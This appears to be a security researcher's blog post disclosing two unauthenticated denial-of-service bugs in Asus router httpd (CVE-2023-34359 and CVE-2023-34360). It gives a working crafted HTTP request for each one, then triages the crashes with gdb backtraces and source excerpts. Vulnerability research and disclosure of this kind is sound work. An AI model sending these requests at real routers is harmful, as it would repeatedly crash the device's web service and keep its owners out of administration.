---
title: "Asus - Unauthenticated httpd DoS Conditions"
date: 2023-07-15T11:16:12Z
draft: true
tags: ["notes"]
---

Recently I came across a few exploitable DoS conditions in Asus `httpd` while doing some fuzzing. Although these aren't the most impactful bugs (the Asus watchdog process restarts `httpd` anytime it detects a crash) they can be exploited unauthenticated. 

Also, even though the watchdog restarts the service, it remains possible to just continue sending DoS requests, crashing it as soon as it restarts, lol.

# Unauthenticated DoS Conditions in Asus `httpd`

First up, CVE-2023-34359

## CVE-2023-34359 PoC

```http
GET / HTTP/1.0
Host: 192.168.1.180:80
Content-Length: 1

0
```

Yup, that's all. I found this a while back and never dug in, all I knew is that a request body sent to `httpd` that began with an integer would crash the web service, but I wasn't sure if this could be something more, so I sat on it for a bit until I had some time to triage it.

Using the [Asus Merling-ng firmware](https://github.com/RMerl/asuswrt-merlin.ng/), I set up an instance to perform some user emulation of the `httpd` bin and fuzzed using AFL with grammar mutators to see if I could generate any unique crashes. AFL of course generated some wild results, and plenty of crashes-- none of which were particularly "unique".

### Core Dumps

Looking at the many core dumps generated by manually invoking the crash and those found by AFL we see a few minor differences, but they all ended up craashing in the same `do_json_decode` function:

#### Crash 1 - Manual

```bash
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-134349_1803037.core
Reading symbols from usr/sbin/httpd...
[...]
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt
#0  0x000444b4 in do_json_decode ()
#1  0x0001b390 in do_ej (path=<optimized out>, stream=0x0) at ej.c:309
#2  0x00019c5c in handle_request ()
#3  0x00016ef8 in main ()
```

#### Crash 2+ - AFL 

```bash
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-134448_1803079.core
Reading symbols from usr/sbin/httpd...
[...]
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt
#0  0x000444b4 in do_json_decode ()
#1  0x00047714 in do_get_ig_config_cgi ()
#2  0x00019c5c in handle_request ()
#3  0x00016ef8 in main ()
```

#### We must go deeper

That's interesting, but not enough to tell what's going on. Recompiling the merlin `httpd` with debugging symbols (-g) yields us some more info on a crash.

*../src/router/httpd/Makefile:342*
```
httpd: $(OBJS)
        @echo " [httpd] CC $@"
        $(CC) -g -o $@ $(OBJS) $(LIBS) $(EXTRALDFLAGS)
```

And the new core dump:
```bash
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-143447_1811053.core
Reading symbols from usr/sbin/httpd...
[...]
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt full
#0  0x000444b4 in do_json_decode ()
No symbol table info available.
#1  0x0001b390 in do_ej (path=<optimized out>, stream=0x0) at ej.c:309
        pat_buf = '\000' <repeats 484 times>...
        pattern = 0xfffec7cc ""
        asp = 0x0
        asp_end = 0x0
        key = 0x0
        key_end = 0x0
        start_pat = <optimized out>
        end_pat = <optimized out>
        lang = 0x1098a0 "EN"
        fp = 0x108150
        ret = <optimized out>
        read_len = <optimized out>
        len = <optimized out>
        no_translate = 1
        kw = {len = 0, tlen = 0, idx = 0x0, buf = 0x0}
        current_lang = <optimized out>
        root = 0x1099d8
#2  0x00019c5c in handle_request ()
No symbol table info available.
#3  0x00016ef8 in main ()
No symbol table info available.
```

Still pretty hard to tell, but it probably has to do with `pat_buf = '\000' <repeats 484 times>...` or `pattern = 0xfffec7cc ""` pointing to empty values.

But, after some fiddling I realized that the full debug symbols weren't displaying. With some coercion (Adding `CFLAGS += -g` lel), we end up with the following core dump backtrace:

```bash
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230104-203755_3086479.core
Reading symbols from usr/sbin/httpd...
[New LWP 3086479]
[...]
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00043fa4 in do_json_decode (root=0x1049d8) at web.c:11576
11576                   json_object_object_foreach(tmp_obj, key, val){
(gdb) bt full
#0  0x00043fa4 in do_json_decode (root=0x1049d8) at web.c:11576
        entrykey = <optimized out>
        entry_nextkey = <optimized out>
        key = 0x0
        val = 0x0
        name_tmp = '\000' <repeats 49 times>
        tmp_obj = 0x104e58
        copy_json = 0x0
#1  0x0001af94 in do_ej ()
No symbol table info available.
#2  0x000199f8 in handle_request ()
No symbol table info available.
#3  0x00016c84 in main ()
No symbol table info available.
```

The crash comes from `web.c:11576`
```
#0  0x00043fa4 in do_json_decode (root=0x1049d8) at web.c:11576
11576                   json_object_object_foreach(tmp_obj, key, val){
```

`do_json_decode` looks like this:
```C
int do_json_decode(struct json_object *root)
{
	char name_tmp[50] = {0};
	struct json_object *tmp_obj = NULL;
	struct json_object *copy_json = NULL;

	decode_json_buffer(post_json_buf);

	if((tmp_obj = json_tokener_parse(post_json_buf)) != NULL){
		json_object_object_foreach(tmp_obj, key, val){
			memset(name_tmp, 0, sizeof(name_tmp));
			wl_nband_to_wlx(key, name_tmp, sizeof(name_tmp));
			copy_json = json_object_get(val);
			json_object_object_add(root, name_tmp, copy_json);
		}
		json_object_put(tmp_obj);
		return 1;
	}else
		return 0;
}
```

So, that makes sense... mostly. `json_object_object_foreach` bails as there's no key-value-pair. Now, why does it bork when sent `0=0`? idk, and I don't care. That's for another day, with a more interesting bug.

## CVE-2023-34360 PoC

If you thought the first one was simple:

```http
GET /login.cgi HTTP/1.1
Host: 192.168.1.2
User-Agent: asusrouter-Windows-DUTUtil-1.0.1.278
```

### Core Dumps
This one was really easy to triage.

```bash
$ ulimit -c unlimited
$ chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/httpd crash3
[...]
nvram_get_buf: = "admin"
nvram_get_int: p_Setting
sem_get: Key: 414b0002
sem_get: Key: 414b0002
nvram_get_int: Unable to read key: /firmadyne/libnvram/p_Setting!
Segmentation fault (core dumped)
$ gdb-multiarch usr/sbin/httpd qemu_httpd_20230105-215542_3503814.core
[...]
pwndbg> bt full
#0  0xfef6d6a4 in strlen () from /home/tester/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/lib/libc.so.6
No symbol table info available.
#1  0x00034c40 in login_cgi (wp=0x103150, query=<optimized out>, path=<optimized out>, url=<optimized out>, arg=<optimized out>, webDir=<optimized out>, urlPrefix=<optimized out>) at web.c:19175
        authorization_t = <optimized out>
        authinfo = '\000' <repeats 499 times>
[...]
```

So, `login_cgi` is called and passed two important values:

`authorization_t` and `authinfo`

Now, does the request contain any authentication / authorization headers? No? What does `web.c` think about that?

*web.c:19169*
```C
/* Is this the right user and password? */
if(nvram_match("http_username", authinfo) && compare_passwd_in_shadow(authinfo, authpass))
        auth_pass = 1;
if(!nvram_get_int("p_Setting")){
        if(strlen(authinfo) > 20)
                authinfo[20] = '\0';
        if(strlen(authpass) > 16)
                *(authpass+16) ='\0';
        if(nvram_match("http_username", authinfo) && compare_passwd_in_shadow(authinfo, authpass))
                auth_pass = 1;
}
```

It doesn't like that much at ALL. Classic null-dereference on 19175: `if(strlen(authpass) > 16)`-- and that makes sense why the first stack entry, `#0  0xfef6d6a4 in strlen ()` causes the crash. 


## Closing thoughts

Simple bugs with fun results and fun triaging :) 

More to come soon!